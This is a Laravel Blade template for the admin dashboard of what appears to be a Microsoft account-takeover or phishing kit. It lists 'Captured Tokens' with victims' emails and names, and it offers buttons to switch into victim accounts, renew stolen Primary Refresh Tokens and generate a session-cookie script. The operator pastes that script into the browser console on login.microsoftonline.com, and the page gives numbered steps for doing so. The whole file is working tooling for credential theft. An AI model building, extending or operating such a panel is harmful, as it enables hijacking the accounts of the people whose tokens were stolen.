@php use Illuminate\Support\Str; @endphp
@extends('layouts.admin')

@section('content')

    <style>
        .token-status {
            transition: all 0.3s ease;
        }

        .status-refreshing {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% {
                opacity: 1;
            }

            50% {
                opacity: 0.3;
            }

            100% {
                opacity: 1;
            }
        }

        /* ===== CONTAINER ===== */
        .token-container {
            margin-top: 20px;
        }

        /* ===== CARD ===== */
        .token-card {
            background: #0d0d0d;
            border: 1px solid #00ff9955;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 20px #00ff9922;
        }

        /* ===== TITLE ===== */
        .token-title {
            color: #00ffcc;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        /* ===== TABLE ===== */
        .token-table {
            width: 100%;
            border-collapse: collapse;
        }

        .token-table th {
            text-align: left;
            padding: 14px;
            border-bottom: 1px solid #00ff9955;
            color: #00ffaa;
            font-size: 14px;
        }

        .token-table td {
            padding: 16px 14px;
            border-bottom: 1px solid #00ff9922;
            vertical-align: middle;
        }

        /* ===== ROW HOVER ===== */
        .token-table tr:hover {
            background: #00ff9911;
        }

        /* ===== EMAIL ===== */
        .email {
            color: #00eaff;
            font-weight: 600;
        }

        /* ===== NAME ===== */
        .name {
            color: #ffffff;
            font-size: 14px;
        }

        /* ===== TOKEN BOX ===== */
        .token-box {
            background: #000;
            border: 1px solid #00ff9955;
            padding: 8px 10px;
            border-radius: 6px;
            font-size: 12px;
            color: #00ffcc;
            font-family: monospace;
        }

        /* ===== STATUS ===== */
        .status-active {
            color: #00ff88;
            font-weight: bold;
        }

        .status-expired {
            color: #ff4444;
            font-weight: bold;
        }

        /* ===== BUTTONS ===== */
        .btn-icon {
            border: none;
            padding: 8px 10px;
            border-radius: 6px;
            margin-right: 5px;
            cursor: pointer;
        }

        .btn-mail {
            background: #00ffaa;
            color: #000;
        }

        .btn-delete {
            background: #ff3b3b;
            color: #fff;
        }

        .btn-copy {
            background: #222;
            color: #00ffcc;
        }

        /* ===== SPACING FIX ===== */
        .action-group {
            display: flex;
            gap: 6px;
        }

        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 12px 20px;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
            z-index: 9999;
        }

        .toast.success {
            background: #28a745;
        }

        .toast.error {
            background: #dc3545;
        }

        .hidden {
            display: none;
        }
    </style>

    <div class="container-fluid token-container">

        <div class="token-card">

            <div class="token-title">📡 Captured Tokens</div>

            <table class="token-table">

                <thead>
                    <tr>
                        <th>#</th>
                        <th>User</th>
                        <!-- <th>Access Token</th> -->
                        <th>Date/Time</th>
                        <th>Last Renew</th>
                        <th>Action</th>
                    </tr>
                </thead>

                <tbody>
                    @foreach($tokens as $token)

                        @php
                            $isExpired = \Carbon\Carbon::parse($token->expires_at)->isPast();
                        @endphp

                        <tr>

                            <!-- ID -->
                            <td>#{{ $loop->iteration }}</td>

                            <!-- USER -->
                            <td>
                                <div class="email">{{ $token->email }}</div>

                                <div class="name">{{ $token->name }}<br>

                            </td>
                            <td>{{ $token->created_at ? $token->created_at->format('Y-m-d H:i:s') : '-' }}</td>
                            <td>{{ $token->updated_at ? $token->updated_at->format('Y-m-d H:i:s') : '-' }}</td>

                            <!-- TOKEN -->
                            <!-- <td> -->
                            <!-- <span class="token-status" data-id="{{ $token->id }}"> -->
                            <!-- @if($token->status === 'dead')
                                                                                                                                                                                                        <span style="color:#ff4444;">Dead</span>
                                                                                                                                                                                                    @elseif(\Carbon\Carbon::parse($token->expires_at)->isPast())
                                                                                                                                                                                                        <span class="status-refreshing" style="color:#ffaa00;">Refreshing...</span>
                                                                                                                                                                                                    @else
                                                                                                                                                                                                        <span style="color:#00ff88;">Connected</span>
                                                                                                                                                                                                    @endif -->
                            <!-- </span> -->
                            <!-- </td> -->

                            <!-- STATUS -->
                            <!-- <td> -->
                            <!-- @if($token->status === 'dead')
                                                                                                                                                                                                    <span style="color:#ff4444;">Dead</span>
                                                                                                                                                                                                @elseif(\Carbon\Carbon::parse($token->expires_at)->isPast())
                                                                                                                                                                                                    <span class="status-refreshing" style="color:#ffaa00;">Refreshing...</span>
                                                                                                                                                                                                @else
                                                                                                                                                                                                    <span style="color:#00ff88;">Connected</span>
                                                                                                                                                                                                @endif -->
                            <!-- </td> -->

                            <!-- ACTION -->
                            <td>
                                <div class="action-group">

                                    <!-- OPEN MAIL -->
                                    @if($token->status !== 'dead')

                                        @if(!empty($token->prt))
                                            <!-- 🔥 PRT MODE -->
                                            <button class="btn-icon btn-mail" onclick="openPrtModal({{ $token->id }})"
                                                title="Generate Cookie Script">
                                                ⚡
                                            </button>
                                        @else
                                            <!-- NORMAL LOGIN -->
                                            <a href="/switch-account/{{ $token->id }}" target="_blank">
                                                <button class="btn-icon btn-mail">📧</button>
                                            </a>
                                        @endif

                                    @else
                                        <button class="btn-icon btn-mail" style="opacity:0.3;cursor:not-allowed;">
                                            📧
                                        </button>
                                    @endif

                                    @if(!auth()->user()->isSubUser())
                                        <!-- COPY TOKEN -->
                                        <!-- <button id="copyBtn" onclick="copyPrt()" class="btn-icon btn-copy">📋 Copy</button>
                                                                                                                                                                                                                                                                                                                                                                                                                  -->
                                        <button onclick="renewPrt({{ $token->id }}, this)" class="btn btn-warning">
                                            Refresh Token
                                        </button>
                                        <!-- DELETE -->
                                        <form action="/tokens/{{ $token->id }}" method="POST">
                                            @csrf
                                            @method('DELETE')

                                            <button class="btn-icon btn-delete" onclick="return confirm('Delete this token?')">
                                                🗑
                                            </button>
                                        </form>
                                    @endif
                                </div>
                            </td>

                        </tr>

                    @endforeach
                </tbody>

            </table>

        </div>

    </div>

    <div id="prtModal"
        style="display:none; position:fixed; inset:0; background:#000000aa; z-index:9999; align-items:center; justify-content:center;">

        <div
            style="background:#111; border-radius:10px; width:500px; padding:20px; box-shadow:0 0 20px #00ffcc; position:relative;">

            <div style="font-weight:bold; color:#00ffcc; margin-bottom:10px;">
                🍪 COOKIE SCRIPT
            </div>

            <div style="font-size:13px; color:#ccc; margin-bottom:15px;">
                1. Open https://login.microsoftonline.com in Chrome/Edge<br>
                2. Press F12 → Console<br>
                3. Paste script & Enter<br>
                4. Wait ~3 seconds
            </div>

            <textarea id="prtScript"
                style="width:100%; height:150px; background:#000; color:#00ffcc; border:1px solid #00ffcc; padding:10px; font-size:12px;"></textarea>

            <div style="margin-top:10px; display:flex; justify-content:space-between;">
                <button id="copyBtn" onclick="copyPrt()" class="btn-icon btn-copy">📋 Copy</button>
                <button onclick="closePrtModal()" class="btn-icon btn-delete">Close</button>
            </div>

        </div>
    </div>

    <script>

        const refreshing = document.querySelectorAll('.status-refreshing').length > 0;

        function copyToken(token) {
            navigator.clipboard.writeText(token);

            const msg = document.createElement('div');
            msg.innerText = "Copied!";
            msg.style.position = "fixed";
            msg.style.bottom = "20px";
            msg.style.right = "20px";
            msg.style.background = "#00ff95";
            msg.style.color = "#000";
            msg.style.padding = "10px 15px";
            msg.style.borderRadius = "6px";
            msg.style.boxShadow = "0 0 10px #00ff95";
            document.body.appendChild(msg);

            setTimeout(() => msg.remove(), 1500);
        }
    </script>

    <script>
        async function fetchTokenStatus() {
            try {
                const res = await fetch('/tokens/status');
                const data = await res.json();

                data.forEach(token => {

                    const el = document.querySelector(`.token-status[data-id='${token.id}']`);
                    if (!el) return;

                    const expired = new Date(token.expires_at) < new Date();

                    let html = '';

                    if (token.status === 'dead') {
                        html = `<span style="color:#ff4444;">Dead</span>`;
                    }
                    else if (token.status === 'refreshing') {
                        html = `<span class="status-refreshing" style="color:#ffaa00;">Refreshing...</span>`;
                    }
                    else {
                        html = `<span style="color:#00ff88;">Connected</span>`;
                    }

                    el.innerHTML = html;
                });

            } catch (e) {
                console.error("Fetch error", e);
            }
        }

        // polling tiap 5 detik
        setInterval(fetchTokenStatus, 5000);

        // run pertama kali
        fetchTokenStatus();
    </script>

    <script>
        console.log("JS loaded");
        let currentTokenId = null;

        function openPrtModal(tokenId) {
            currentTokenId = tokenId;

            document.getElementById('prtModal').style.display = 'flex';

            const textarea = document.getElementById('prtScript');
            const copyBtn = document.getElementById('copyBtn');

            textarea.value = "Generating cookie...";
            copyBtn.disabled = true;

            fetch(`/tokens/${tokenId}/cookie`)
                .then(res => res.json())
                .then(data => {

                    if (data.error) {
                        textarea.value = "❌ " + data.error;
                        return;
                    }

                    textarea.value = data.script;
                    copyBtn.disabled = false;

                })
                .catch(() => {
                    textarea.value = "❌ Failed generate script";
                });
        }
        document.getElementById('prtModal').addEventListener('click', function (e) {
            if (e.target.id === 'prtModal') {
                closePrtModal();
            }
        });

        function closePrtModal() {
            document.getElementById('prtModal').style.display = 'none';
        }

        function copyPrt() {
            const text = document.getElementById('prtScript').value;
            navigator.clipboard.writeText(text);

            const msg = document.createElement('div');
            msg.innerText = "Script copied!";
            msg.style.position = "fixed";
            msg.style.bottom = "20px";
            msg.style.right = "20px";
            msg.style.background = "#00ff95";
            msg.style.color = "#000";
            msg.style.padding = "10px 15px";
            msg.style.borderRadius = "6px";
            document.body.appendChild(msg);

            setTimeout(() => msg.remove(), 1500);
        }



        async function renewPrt(tokenId, btn) {

            try {
                // 🔄 set loading
                btn.disabled = true;
                btn.innerHTML = '<span class="status-refreshing">Refreshing...</span>';


                await new Promise(resolve => setTimeout(resolve, 100));

                const response = await fetch(`/tokens/${tokenId}/renew`, {
                    method: "POST",
                    headers: {
                        "X-CSRF-TOKEN": document.querySelector('meta[name="csrf-token"]').content
                    }
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.message || "Failed to renew token");
                }


                const row = btn.closest('tr');
                const lastRenewCell = row.children[3];

                const now = new Date();
                const formatted =
                    now.getFullYear() + '-' +
                    String(now.getMonth() + 1).padStart(2, '0') + '-' +
                    String(now.getDate()).padStart(2, '0') + ' ' +
                    String(now.getHours()).padStart(2, '0') + ':' +
                    String(now.getMinutes()).padStart(2, '0') + ':' +
                    String(now.getSeconds()).padStart(2, '0');

                lastRenewCell.innerText = formatted;

                showToast("PRT successfully renewed", "success");

            } catch (err) {

                showToast(err.message || "Failed to renew PRT", "error");

            } finally {

                // biar user sempat lihat "Refreshing..."
                setTimeout(() => {
                    btn.disabled = false;
                    btn.innerText = "Refresh Token";
                }, 800);
            }
        }
        function showToast(message, type = "success") {
            const toast = document.getElementById('toast');

            toast.innerText = message;
            toast.className = `toast ${type}`;
            toast.classList.remove('hidden');

            setTimeout(() => {
                toast.classList.add('hidden');
            }, 3000);
        }
    </script>
    <div id="toast" class="toast hidden"></div>

@endsection